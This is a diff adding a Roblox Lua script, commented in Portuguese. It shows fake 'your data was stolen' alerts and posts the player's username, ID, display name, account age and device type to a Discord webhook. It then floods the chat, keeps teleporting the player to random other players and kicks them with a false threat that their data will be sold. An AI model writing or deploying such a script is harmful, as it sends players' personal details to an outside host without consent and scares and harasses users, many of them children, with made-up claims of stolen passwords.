@@ -1,0 +1,152 @@
+-- Script para exibir notificaÃ§Ãµes em sequÃªncia, enviar dados para um webhook, flodar o chat, teletransportar aleatoriamente e kickar o jogador
+
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+local UserInputService = game:GetService("UserInputService")
+local HttpService = game:GetService("HttpService")
+local Chat = game:GetService("Chat")
+
+-- Substitua pelo URL do seu webhook do Discord
+local webhookUrl = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"
+
+local function showNotification(title, text, duration)
+    StarterGui:SetCore("SendNotification", {
+        Title = title;
+        Text = text;
+        Duration = duration;
+    })
+end
+
+local function sendToDiscord(playerName, playerId, playerDisplayName, playerAccountAge, deviceType)
+    local data = {
+        ["content"] = "InformaÃ§Ãµes do Jogador",
+        ["embeds"] = {{
+            ["title"] = "InformaÃ§Ãµes do Jogador",
+            ["description"] = "Nome: " .. playerName .. "\n" ..
+                               "ID: " .. playerId .. "\n" ..
+                               "Display Name: " .. playerDisplayName .. "\n" ..
+                               "Idade da Conta: " .. playerAccountAge .. " dias\n" ..
+                               "Dispositivo: " .. deviceType .. "\n" ..
+                               "Senha: armazenada",
+            ["color"] = 16711680 -- Cor vermelha para destaque
+        }}
+    }
+
+    local jsonData = HttpService:JSONEncode(data)
+    
+    -- Envia o POST para o webhook do Discord
+    local success, response = pcall(function()
+        HttpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson)
+    end)
+    
+    if not success then
+        warn("Falha ao enviar dados para o Discord: " .. response)
+    end
+end
+
+local function floodChat(message, duration)
+    local player = Players.LocalPlayer
+    if player and player.Character and player.Character:FindFirstChild("Head") then
+        local startTime = tick()
+        while tick() - startTime < duration do
+            Chat:Chat(player.Character.Head, message, Enum.ChatColor.Red)
+            wait(0.5) -- Espera meio segundo entre mensagens
+        end
+    end
+end
+
+local function teleportRandomly()
+    local player = Players.LocalPlayer
+    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+        while true do
+            local allPlayers = Players:GetPlayers()
+            local targetPlayers = {}
+            
+            -- Cria uma lista de jogadores excluindo o prÃ³prio jogador
+            for _, otherPlayer in pairs(allPlayers) do
+                if otherPlayer ~= player then
+                    if otherPlayer.Character and otherPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                        table.insert(targetPlayers, otherPlayer)
+                    end
+                end
+            end
+
+            if #targetPlayers > 0 then
+                -- Escolhe um jogador aleatÃ³rio
+                local targetPlayer = targetPlayers[math.random(1, #targetPlayers)]
+                local targetPosition = targetPlayer.Character.HumanoidRootPart.Position
+                
+                -- Teleporta o jogador atual para a posiÃ§Ã£o do jogador alvo
+                player.Character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)
+            end
+            
+            -- Espera 5 segundos antes de teletransportar novamente
+            wait(5)
+        end
+    end
+end
+
+local function simulateDataTheft()
+    -- Primeira notificaÃ§Ã£o
+    showNotification("AtenÃ§Ã£o", "Copiando dados...", 3)
+    
+    -- Espera 4 segundos antes de mostrar a prÃ³xima notificaÃ§Ã£o
+    wait(4)
+    
+    -- Segunda notificaÃ§Ã£o
+    showNotification("Alerta", "Seus dados foram roubados ez kkk", 3)
+    
+    -- Espera 1 segundo antes de mostrar as informaÃ§Ãµes do jogador
+    wait(1)
+    
+    -- Obter informaÃ§Ãµes do jogador
+    local player = Players.LocalPlayer
+    if player then
+        local playerName = player.Name
+        local playerId = player.UserId
+        local playerDisplayName = player.DisplayName
+        local playerAccountAge = player.AccountAge
+
+        -- Verificar se o jogador estÃ¡ usando um PC ou um dispositivo mÃ³vel
+        local deviceType
+        if UserInputService.TouchEnabled then
+            deviceType = "Celular"
+        else
+            deviceType = "PC"
+        end
+        
+        -- Mostrar as informaÃ§Ãµes do jogador em uma notificaÃ§Ã£o
+        showNotification("InformaÃ§Ãµes do Jogador", 
+            "Nome: " .. playerName .. "\n" ..
+            "ID: " .. playerId .. "\n" ..
+            "Display Name: " .. playerDisplayName .. "\n" ..
+            "Idade da Conta: " .. playerAccountAge .. " dias\n" ..
+            "Dispositivo: " .. deviceType .. "\n" ..
+            "Senha: armazenada", 10)
+
+        -- Enviar informaÃ§Ãµes para o Discord
+        sendToDiscord(playerName, playerId, playerDisplayName, playerAccountAge, deviceType)
+
+        -- Iniciar o flood do chat por 2 segundos
+        floodChat("ez kkkkkk", 2)
+        
+        -- Iniciar o teletransporte aleatÃ³rio
+        local teleportThread = coroutine.create(function()
+            teleportRandomly()
+        end)
+        coroutine.resume(teleportThread)
+        
+        -- Adiciona uma notificaÃ§Ã£o final
+        wait(2) -- Espera um pouco antes de mostrar a Ãºltima notificaÃ§Ã£o
+        showNotification("Aviso", "Roubado por nob999", 3)
+        
+        -- Espera 1 segundo antes de kickar o jogador
+        wait(1)
+
+        -- Kica o jogador com uma mensagem especÃ­fica
+        player:Kick("Todos seus d4d0s do r0bl0x for4m R0uB4D0s 4P0S 25 M1NUTOS S3us D4d0s seram vendidos")
+    end
+end
+
+-- Executar o script
+simulateDataTheft()
